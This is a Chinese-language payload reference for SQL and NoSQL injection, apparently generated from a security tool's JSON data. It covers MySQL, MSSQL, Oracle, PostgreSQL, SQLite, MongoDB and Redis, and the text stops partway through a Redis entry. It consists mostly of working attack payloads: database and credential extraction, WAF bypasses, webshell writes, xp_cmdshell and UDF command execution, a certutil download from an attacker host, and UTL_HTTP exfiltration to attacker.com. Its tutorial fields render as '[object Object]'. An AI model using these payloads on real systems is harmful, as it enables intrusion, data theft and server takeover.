# SQL/NoSQL注入 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（17 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. MySQL注入 - 基础探测

- **id:** `sqli-mysql-basic`
- **分类:** SQL/NoSQL注入 / MySQL
- **tags:** `sqli` `mysql` `injection` `database`

MySQL数据库注入基础探测与数据提取技术

**前置条件**

- 目标存在SQL注入点
- 后端数据库为MySQL
- 了解基本SQL语法

**利用步骤**

#### 1. 探测注入点

```
' OR '1'='1
' OR 1=1--
1' AND '1'='1
1' AND '1'='2
```

使用单引号和布尔条件探测是否存在注入点

| 片段 | 说明 | 类型 |
|---|---|---|
| `OR '1'='1'` | 逻辑永真 | keyword |
| `--` | SQL注释 | operator |

#### 2. 确定列数

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
直到报错确定列数
或使用:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

使用ORDER BY或UNION SELECT NULL确定查询列数

| 片段 | 说明 | 类型 |
|---|---|---|
| `ORDER BY` | 按指定列排序 | value |
| `NULL` | 空值占位符 | keyword |

#### 3. 确定显示位置

```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
```

找出哪些列会显示在页面上

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION SELECT` | 联合查询，合并结果集 | value |
| `1,2,3` | 数字标记显示位置 | value |

#### 4. 获取数据库信息

```
' UNION SELECT 1,database(),3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,version(),3--
' UNION SELECT 1,@@hostname,3--
```

获取当前数据库名、用户、版本等基础信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `database()` | 返回当前数据库名 | function |
| `user()` | 返回当前用户 | function |
| `version()` | 返回MySQL版本 | function |

#### 5. 枚举所有数据库

```
' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--
' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--
```

获取MySQL服务器上所有数据库名

| 片段 | 说明 | 类型 |
|---|---|---|
| `information_schema` | MySQL系统数据库，存储元数据 | keyword |
| `schemata` | 存储所有数据库名的表 | value |
| `group_concat()` | 将多行合并为一行 | function |

#### 6. 枚举表名

```
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--
```

获取指定数据库中的所有表名

| 片段 | 说明 | 类型 |
|---|---|---|
| `information_schema.tables` | 存储所有表信息的系统表 | value |
| `table_schema` | 表所属的数据库名 | value |
| `table_name` | 表名 | value |

#### 7. 枚举列名

```
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--
```

获取指定表的所有列名

| 片段 | 说明 | 类型 |
|---|---|---|
| `information_schema.columns` | 存储所有列信息的系统表 | value |
| `column_name` | 列名 | value |

#### 8. 提取数据

```
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--
' UNION SELECT username,password,3 FROM users LIMIT 0,1--
```

从目标表中提取敏感数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `0x3a` | 冒号的十六进制，用于分隔符 | encoding |
| `LIMIT 0,1` | 限制返回第一行结果 | value |

**WAF 绕过**

#### 大小写混淆

```
' UnIoN SeLeCt 1,database(),3--
' uNiOn SeLeCt 1,user(),3--
```

使用大小写混合绕过关键字过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `UnIoN SeLeCt` | 混合大小写绕过简单关键字匹配 | value |

#### 内联注释

```
' /*!UNION*/ /*!SELECT*/ 1,database(),3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
```

使用MySQL特有内联注释绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `/*!UNION*/` | MySQL会执行注释内的SQL | value |
| `/*!50000` | 指定MySQL版本5.00.00以上执行 | value |

#### 双写绕过

```
' UNUNIONION SELSELECTECT 1,database(),3--
' UNIunionON SELselectECT 1,2,3--
```

双写关键字绕过替换过滤

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNUNIONION` | WAF删除UNION后变成UNION | value |
| `SELSELECTECT` | WAF删除SELECT后变成SELECT | value |

#### 空格替代

```
'/**/UNION/**/SELECT/**/1,database(),3--
' %0aUNION%0aSELECT%0a1,2,3--
'(UNION(SELECT(1),(database()),(3)))--
```

使用注释、换行、括号替代空格

| 片段 | 说明 | 类型 |
|---|---|---|
| `/**/` | 注释替代空格 | operator |
| `%0a` | 换行符URL编码 | encoding |
| `()` | 括号包裹替代空格 | value |

#### 编码绕过

```
' UNION SELECT 1,hex(database()),3--
' UNION SELECT 1,unhex(hex(database())),3--
' UNION SELECT 1,conv(hex(database()),16,10),3--
```

使用编码函数绕过关键字检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `hex()` | 十六进制编码 | function |
| `unhex()` | 十六进制解码 | function |
| `conv()` | 进制转换 | function |

**教程**

[object Object]

---

### 2. MySQL注入 - 高级技术

- **id:** `sqli-mysql-advanced`
- **分类:** SQL/NoSQL注入 / MySQL
- **tags:** `sqli` `mysql` `advanced` `file-read` `rce`

MySQL高级注入技术：文件读写、UDF提权、命令执行

**前置条件**

- MySQL用户具有FILE权限
- 知道网站绝对路径
- secure_file_priv配置允许

**利用步骤**

#### 1. 检测FILE权限

```
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--
' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--
```

检测当前用户是否有FILE权限

| 片段 | 说明 | 类型 |
|---|---|---|
| `mysql.user` | MySQL用户权限表 | value |
| `file_priv` | FILE权限字段 | value |
| `current_user()` | 返回当前用户 | function |

#### 2. 获取网站路径

```
' UNION SELECT 1,@@basedir,3--
' UNION SELECT 1,@@datadir,3--
' UNION SELECT 1,load_file('/etc/passwd'),3--
```

通过错误信息或读取文件获取网站路径

| 片段 | 说明 | 类型 |
|---|---|---|
| `@@basedir` | MySQL安装目录 | value |
| `@@datadir` | MySQL数据目录 | value |

#### 3. 读取敏感文件

```
' UNION SELECT 1,load_file('/etc/passwd'),3--
' UNION SELECT 1,load_file('/var/www/html/config.php'),3--
' UNION SELECT 1,load_file('C:/windows/win.ini'),3--
```

使用load_file读取系统敏感文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `load_file()` | MySQL读取文件函数 | function |
| `/etc/passwd` | Linux用户信息文件 | path |

#### 4. 写入WebShell

```
' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--
```

使用INTO OUTFILE写入WebShell

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT` | 查询数据 | keyword |
| `INTO OUTFILE` | 写入文件 | keyword |
| `--` | SQL注释 | operator |
| `system()` | 系统命令执行 | function |
| `eval()` | 代码执行 | function |

> platform: `linux`

#### 5. 日志写Shell

```
SET GLOBAL general_log='ON';
SET GLOBAL general_log_file='/var/www/html/shell.php';
SELECT '<?php @eval($_POST[cmd]);?>';
```

通过开启general_log写入Shell

| 片段 | 说明 | 类型 |
|---|---|---|
| `general_log` | MySQL通用查询日志开关 | value |
| `general_log_file` | 日志文件路径 | value |

> platform: `linux`

#### 6. UDF提权

```
SELECT load_file('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';
SELECT sys_eval('id');
```

使用UDF提权执行系统命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `INTO DUMPFILE` | 写入二进制文件 | keyword |
| `CREATE FUNCTION` | 创建自定义函数 | value |
| `sys_eval` | 执行系统命令的UDF函数 | value |

> platform: `linux`

**WAF 绕过**

#### Hex编码写入

```
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '/var/www/html/shell.php'--
```

使用十六进制编码绕过关键字检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `0x3c3f706870...` | PHP一句话的十六进制编码 | value |
| `INTO DUMPFILE` | 写入二进制文件 | keyword |

> platform: `linux`

#### Char编码绕过

```
' UNION SELECT 1,CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62),3 INTO OUTFILE '/var/www/html/s.php'--
```

使用CHAR函数编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `CHAR(60,63...)` | 使用ASCII码值构造字符串 | value |

> platform: `linux`

**教程**

[object Object]

---

### 3. MSSQL注入 - 基础探测

- **id:** `sqli-mssql-basic`
- **分类:** SQL/NoSQL注入 / MSSQL
- **tags:** `sqli` `mssql` `sqlserver` `injection`

Microsoft SQL Server数据库注入技术

**前置条件**

- 目标存在SQL注入点
- 后端使用MSSQL数据库

**利用步骤**

#### 1. 探测注入点

```
' OR 1=1--
' OR '1'='1
1' AND 1=1--
1' AND 1=2--
```

基础注入探测

| 片段 | 说明 | 类型 |
|---|---|---|
| `--` | MSSQL单行注释符 | operator |
| `OR 1=1` | 永真条件 | value |

#### 2. 获取版本信息

```
' UNION SELECT 1,@@version,3--
' UNION SELECT 1,SERVERPROPERTY('Edition'),3--
' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--
```

获取MSSQL版本信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `@@version` | 返回SQL Server版本 | value |
| `SERVERPROPERTY()` | 返回服务器属性信息 | function |

#### 3. 获取用户信息

```
' UNION SELECT 1,user_name(),3--
' UNION SELECT 1,suser_name(),3--
' UNION SELECT 1,system_user,3--
' UNION SELECT 1,is_srvrolemember('sysadmin'),3--
```

获取当前用户及权限信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `user_name()` | 返回当前数据库用户 | function |
| `suser_name()` | 返回登录名 | function |
| `is_srvrolemember()` | 检查是否属于服务器角色 | function |

#### 4. 获取数据库信息

```
' UNION SELECT 1,db_name(),3--
' UNION SELECT 1,db_name(0),3--
' UNION SELECT 1,db_name(1),3--
' UNION SELECT name,2,3 FROM master..sysdatabases--
```

获取所有数据库名

| 片段 | 说明 | 类型 |
|---|---|---|
| `db_name()` | 返回当前数据库名 | function |
| `db_name(N)` | 返回第N个数据库名 | value |
| `master..sysdatabases` | 系统数据库，存储所有库信息 | value |

#### 5. 获取表名

```
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
' UNION SELECT 1,name,3 FROM sys.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
```

获取用户表名

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `WHERE` | 条件筛选 | keyword |
| `information_schema` | 元数据库 | value |
| `--` | SQL注释 | operator |

#### 6. 获取列名

```
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

获取指定表的列名

| 片段 | 说明 | 类型 |
|---|---|---|
| `syscolumns` | 系统列信息表 | value |
| `information_schema.columns` | 标准信息模式视图 | value |

#### 7. 提取数据

```
' UNION SELECT 1,username+':'+password,3 FROM users--
' UNION SELECT TOP 1 username,password,3 FROM users--
```

提取表中的数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `+` | MSSQL字符串连接符 | operator |
| `TOP 1` | 返回第一条记录 | value |

**WAF 绕过**

#### Hex编码

```
' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--
```

使用Hex编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `fn_varbintohexstr()` | 转换为十六进制字符串 | function |

#### 注释绕过

```
'/**/UNION/**/SELECT/**/1,2,3--
' UN%00ION SELECT 1,2,3--
```

使用注释和空字节绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |
| `/*...*/` | 内联注释 | operator |
| `%xx` | URL编码 | encoding |

**教程**

[object Object]

---

### 4. MSSQL注入 - 高级技术

- **id:** `sqli-mssql-advanced`
- **分类:** SQL/NoSQL注入 / MSSQL
- **tags:** `sqli` `mssql` `xp_cmdshell` `rce`

MSSQL高级注入：xp_cmdshell、SP_OACREATE命令执行

**前置条件**

- MSSQL具有高权限
- xp_cmdshell可用或可开启

**利用步骤**

#### 1. 检测xp_cmdshell状态

```
' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--
'; EXEC master..xp_cmdshell 'whoami'--
```

检测xp_cmdshell是否可用

| 片段 | 说明 | 类型 |
|---|---|---|
| `OBJECT_ID()` | 检查对象是否存在 | function |
| `xp_cmdshell` | 执行系统命令的扩展存储过程 | keyword |

> platform: `windows`

#### 2. 开启xp_cmdshell

```
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

如果xp_cmdshell被禁用，尝试开启

| 片段 | 说明 | 类型 |
|---|---|---|
| `xp_cmdshell` | 系统命令执行 | function |
| `EXEC` | 执行存储过程 | keyword |
| `--` | SQL注释 | operator |

> platform: `windows`

#### 3. 执行系统命令

```
'; EXEC master..xp_cmdshell 'whoami'--
'; EXEC master..xp_cmdshell 'net user'--
'; EXEC master..xp_cmdshell 'dir C:'--
```

使用xp_cmdshell执行系统命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `master..xp_cmdshell` | 调用master数据库中的xp_cmdshell | value |

> platform: `windows`

#### 4. 写入WebShell

```
'; EXEC master..xp_cmdshell 'echo ^<%execute(request("cmd"))^> > C:\inetpub\wwwroot\shell.asp'--
'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\inetpub\wwwroot\shell.aspx'--
```

写入或下载WebShell

| 片段 | 说明 | 类型 |
|---|---|---|
| `echo` | 写入文件内容 | command |
| `certutil` | Windows内置下载工具 | value |

> platform: `windows`

#### 5. SP_OACREATE方法

```
'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
DECLARE @shell INT;
EXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;
EXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\output.txt';--
```

使用SP_OACREATE执行命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `SP_OACREATE` | 创建OLE自动化对象 | keyword |
| `wscript.shell` | Windows脚本宿主对象 | value |
| `SP_OAMETHOD` | 调用对象方法 | value |

> platform: `windows`

**WAF 绕过**

#### 堆叠查询

```
'; EXEC('EXEC master..xp_cmdshell ''whoami''')--
'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--
```

使用动态SQL绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `EXEC()` | 执行动态SQL | function |
| `DECLARE` | 声明变量 | keyword |

> platform: `windows`

**教程**

[object Object]

---

### 5. Oracle注入 - 基础探测

- **id:** `sqli-oracle-basic`
- **分类:** SQL/NoSQL注入 / Oracle
- **tags:** `sqli` `oracle` `injection`

Oracle数据库注入基础技术

**前置条件**

- 目标存在SQL注入点
- 后端使用Oracle数据库

**利用步骤**

#### 1. 探测注入点

```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL FROM DUAL--
```

探测注入点类型

| 片段 | 说明 | 类型 |
|---|---|---|
| `FROM DUAL` | Oracle虚拟表，SELECT必须有FROM | value |
| `NULL,NULL,NULL` | 探测列数 | value |

#### 2. 获取版本信息

```
' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--
' UNION SELECT version,NULL FROM v$instance--
```

获取Oracle版本

| 片段 | 说明 | 类型 |
|---|---|---|
| `v$version` | Oracle版本信息视图 | value |
| `v$instance` | 实例信息视图 | value |
| `rownum=1` | 限制返回一行 | value |

#### 3. 获取用户信息

```
' UNION SELECT username,NULL FROM all_users--
' UNION SELECT user,NULL FROM DUAL--
' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--
```

获取数据库用户

| 片段 | 说明 | 类型 |
|---|---|---|
| `all_users` | 所有用户视图 | value |
| `user` | 当前用户 | value |
| `SYS_CONTEXT` | 获取会话上下文信息 | value |

#### 4. 获取表名

```
' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--
' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--
```

获取表名

| 片段 | 说明 | 类型 |
|---|---|---|
| `all_tables` | 所有表视图 | value |
| `owner` | 表所属用户 | value |
| `||` | Oracle字符串连接符 | operator |

#### 5. 获取列名

```
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

获取列名和数据类型

| 片段 | 说明 | 类型 |
|---|---|---|
| `all_tab_columns` | 所有列信息视图 | value |
| `data_type` | 列数据类型 | value |

#### 6. 提取数据

```
' UNION SELECT username||':'||password,NULL FROM users--
' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--
```

提取表数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `rownum<=1` | Oracle分页方式 | value |

**WAF 绕过**

#### UTL_HTTP外带

```
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--
```

使用UTL_HTTP外带数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `UTL_HTTP.REQUEST()` | 发起HTTP请求 | function |

**教程**

[object Object]

---

### 6. Oracle注入 - 高级技术

- **id:** `sqli-oracle-advanced`
- **分类:** SQL/NoSQL注入 / Oracle
- **tags:** `sqli` `oracle` `advanced` `rce`

Oracle高级注入技术：Java存储过程、UTL_FILE文件操作

**前置条件**

- Oracle高权限
- Java虚拟机可用

**利用步骤**

#### 1. 检测Java权限

```
' UNION SELECT 1,CASE WHEN DBMS_JAVA.TEST_OUTPUT('test') IS NOT NULL THEN 'YES' ELSE 'NO' END FROM DUAL--
```

检测Java存储过程是否可用

| 片段 | 说明 | 类型 |
|---|---|---|
| `DBMS_JAVA` | Oracle Java包 | value |
| `TEST_OUTPUT` | 测试Java功能 | value |

#### 2. 创建Java执行函数

```
' UNION SELECT 1,(SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec("cmd /c whoami")') FROM DUAL)--
```

使用Java执行系统命令

| 片段 | 说明 | 类型 |
|---|---|---|
| `DBMS_JAVA.RUNJAVA` | 执行Java代码 | value |
| `Runtime.exec` | Java执行系统命令 | value |

#### 3. UTL_FILE读取文件

```
' UNION SELECT 1,UTL_FILE.FGETATTR('DATA_PUMP_DIR','/etc/passwd','file_exists') FROM DUAL--
```

使用UTL_FILE操作文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `UTL_FILE` | Oracle文件操作包 | value |
| `DATA_PUMP_DIR` | Oracle目录对象 | value |

**WAF 绕过**

#### Oracle特有函数绕过

```
' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
' UNION SELECT 1,DBMS_PIPE.PACK_MESSAGE(user)||DBMS_PIPE.SEND_MESSAGE('pipe1') FROM DUAL--
' UNION SELECT 1,CASE WHEN (SELECT user FROM DUAL)='SYS' THEN 'admin' ELSE 'user' END FROM DUAL--
```

使用Oracle XMLType、DBMS_PIPE、CASE表达式等特有函数绕过WAF关键字检测

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `CASE WHEN` | 条件表达式 | keyword |
| `--` | SQL注释 | operator |

#### Oracle注释与编码绕过

```
' UNION/**/SELECT/**/1,user/**/FROM/**/DUAL--
' UNION SELECT 1,CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user) FROM DUAL--
' UNION SELECT 1,UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(user))) FROM DUAL--
```

使用注释符替代空格、CHR()编码字符串、RAWTOHEX/UTL_ENCODE进行数据编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `HEX()` | 十六进制编码 | encoding |
| `--` | SQL注释 | operator |
| `/*...*/` | 内联注释 | operator |
| `base64` | Base64编码 | encoding |

**教程**

[object Object]

---

### 7. PostgreSQL注入 - 基础探测

- **id:** `sqli-postgres-basic`
- **分类:** SQL/NoSQL注入 / PostgreSQL
- **tags:** `sqli` `postgresql` `postgres` `injection`

PostgreSQL数据库注入技术

**前置条件**

- 目标存在SQL注入点
- 后端使用PostgreSQL

**利用步骤**

#### 1. 探测注入点

```
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
```

探测注入点

| 片段 | 说明 | 类型 |
|---|---|---|
| `--` | PostgreSQL注释符 | operator |

#### 2. 获取版本信息

```
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--
```

获取数据库信息

| 片段 | 说明 | 类型 |
|---|---|---|
| `version()` | PostgreSQL版本 | function |
| `current_database()` | 当前数据库 | function |
| `current_user` | 当前用户 | value |

#### 3. 获取表名

```
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```

获取public模式下的表

| 片段 | 说明 | 类型 |
|---|---|---|
| `information_schema.tables` | 标准表信息视图 | value |
| `table_schema` | 模式名，public是默认模式 | value |

#### 4. 获取列名

```
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

获取列名

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `WHERE` | 条件筛选 | keyword |
| `information_schema` | 元数据库 | value |
| `--` | SQL注释 | operator |

#### 5. 读取文件

```
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--
```

使用pg_read_file读取文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `pg_read_file()` | PostgreSQL读取文本文件 | function |
| `pg_read_binary_file()` | 读取二进制文件 | function |

> platform: `linux`

#### 6. 写入文件

```
' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--
```

使用COPY写入文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `COPY` | PostgreSQL COPY命令 | value |
| `TO` | 指定输出文件 | value |

> platform: `linux`

**WAF 绕过**

#### 编码绕过

```
' UNION SELECT chr(60)||chr(63)||'php system($_GET[c]);'||chr(63)||chr(62),NULL--
```

使用chr函数编码

| 片段 | 说明 | 类型 |
|---|---|---|
| `chr()` | 返回ASCII字符 | function |

**教程**

[object Object]

---

### 8. SQLite注入

- **id:** `sqli-sqlite-basic`
- **分类:** SQL/NoSQL注入 / SQLite
- **tags:** `sqli` `sqlite`

SQLite数据库注入攻击

**前置条件**

- SQLite数据库
- 存在注入点

**利用步骤**

#### 1. 探测注入点

```
' OR 1=1--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```

探测注入点

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果集 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

#### 2. 获取版本

```
' UNION SELECT sqlite_version(),NULL--
```

获取SQLite版本

| 片段 | 说明 | 类型 |
|---|---|---|
| `sqlite_version()` | SQLite版本函数 | function |

#### 3. 获取表名

```
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
```

获取所有表名

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果集 | keyword |
| `SELECT` | 查询数据 | keyword |
| `--` | SQL注释 | operator |

#### 4. 获取表结构

```
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--
```

获取建表语句

| 片段 | 说明 | 类型 |
|---|---|---|
| `sql` | 建表SQL语句 | value |

#### 5. 读取文件

```
' UNION SELECT load_extension('libsqlite3.so'),NULL--
' UNION SELECT readfile('/etc/passwd'),NULL--
```

读取文件(需要扩展)

| 片段 | 说明 | 类型 |
|---|---|---|
| `load_extension` | 加载扩展库 | value |
| `readfile` | 读取文件(需扩展) | value |

**WAF 绕过**

#### SQLite字符编码绕过

```
' UNION SELECT CHAR(116,101,115,116),NULL--
' UNION SELECT X'746573746461746131',NULL--
' AND typeof(CASE WHEN unicode(substr((SELECT name FROM sqlite_master LIMIT 1),1,1))>96 THEN 1 ELSE 0.0 END)='integer'--
```

使用CHAR()函数构造字符串、X前缀十六进制字面量、typeof()和unicode()进行类型推断盲注绕过WAF

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `CASE WHEN` | 条件表达式 | keyword |
| `SUBSTRING` | 字符串截取 | function |
| `--` | SQL注释 | operator |

#### SQLite运算符与函数替代

```
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name LIKE '%user%')--
' AND (SELECT name FROM sqlite_master WHERE type='table' AND name GLOB '*user*')--
' UNION SELECT replace(group_concat(name,','),'_',''),NULL FROM sqlite_master WHERE type='table'--
' AND instr((SELECT sql FROM sqlite_master LIMIT 1),'password')>0--
```

使用LIKE/GLOB模式匹配替代等号、instr()替代SUBSTRING、group_concat配合replace混淆数据

| 片段 | 说明 | 类型 |
|---|---|---|
| `UNION` | 合并查询结果 | keyword |
| `SELECT...FROM` | 查询数据 | keyword |
| `WHERE` | 条件筛选 | keyword |
| `CONCAT` | 字符串拼接 | function |
| `GROUP_CONCAT` | 分组拼接 | function |
| `--` | SQL注释 | operator |

**教程**

[object Object]

---

### 9. MongoDB注入

- **id:** `sqli-mongodb-basic`
- **分类:** SQL/NoSQL注入 / MongoDB
- **tags:** `nosql` `mongodb` `injection`

NoSQL数据库注入攻击技术

**前置条件**

- 目标使用MongoDB
- 存在用户输入拼接查询

**利用步骤**

#### 1. 探测注入点

```
{"username": "admin", "password": "password"}
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
```

探测MongoDB注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `$ne` | 不等于操作符 | variable |
| `$gt` | 大于操作符 | variable |

#### 2. 绕过认证

```
{"username": "admin", "password": {"$ne": "wrongpass"}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```

绕过登录认证

| 片段 | 说明 | 类型 |
|---|---|---|
| `$ne` | 不等于，返回所有密码不为wrongpass的用户 | variable |

#### 3. 逻辑运算注入

```
{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}
```

使用$or逻辑运算

| 片段 | 说明 | 类型 |
|---|---|---|
| `$or` | 或运算符 | variable |

#### 4. 正则注入

```
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

正则表达式注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `$regex` | 正则匹配操作符 | variable |
| `^admin` | 以admin开头 | value |

#### 5. $where注入

```
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}
```

$where子句JavaScript注入

| 片段 | 说明 | 类型 |
|---|---|---|
| `$where` | 执行JavaScript代码 | variable |
| `this.username` | 当前文档的字段 | value |

#### 6. 盲注提取数据

```
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
逐字符枚举用户名
```

使用正则逐字符提取

| 片段 | 说明 | 类型 |
|---|---|---|
| `{"username":` | 命令/载荷起始 | command |
| ` {"$regex": "^a"}} {"username": {"$regex": "^ad"}} {"username": {"$regex": "^adm"}} 逐字符枚举用户名` | 参数与载荷内容 | value |

**WAF 绕过**

#### Unicode绕过

```
{"username": {"\u0024ne": ""}}
使用Unicode编码$符号
```

Unicode编码绕过

| 片段 | 说明 | 类型 |
|---|---|---|
| `\uXXXX` | Unicode编码 | encoding |

**教程**

[object Object]

---

### 10. Redis未授权访问

- **id:** `sqli-redis`
- **分类:** SQL/NoSQL注入 / Redis
- **tags:** `redis` `nosql` `injection`

Redis未授权访问和命令注入

**前置条件**

- Redis服务可访问
- 未授权或弱密码

**利用步骤**

#### 1. 探测Redis

```
redis-cli -h target.com ping
redis-cli -h target.com info
```

探测Redis服务

| 片段 | 说明 | 类型 |
|---|---|---|
| `redis-cli` | Redis命令行客户端 | value |
| `ping` | 测试连接 | command |
| `info` | 获取服务器信息 | value |

#### 2. 未授权访问

```
redis-cli -h target.com
> INFO
> KEYS *
> GET sensitive_key
```

未授权访问Redis

| 片段 | 说明 | 类型 |
|---|---|---|
| `INFO` | 获取Redis信息 | value |
| `KEYS *` | 列出所有键 | value |

#### 3. 写入Webshell

```
redis-cli -h target.com
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> SAVE
```

写入Webshell

| 片段 | 说明 | 类型 |
|---|---|---|
| `CONFIG SET dir` | 设置RDB文件保存目录 | value |
| `CONFIG SET dbfilename` | 设置RDB文件名 | value |
| `SAVE` | 保存数据库到文件 | value |

> platform: `linux`

#### 4. 写入SSH公钥

```
redis-cli -h target.com
> CONFIG SET dir /root/.ssh/
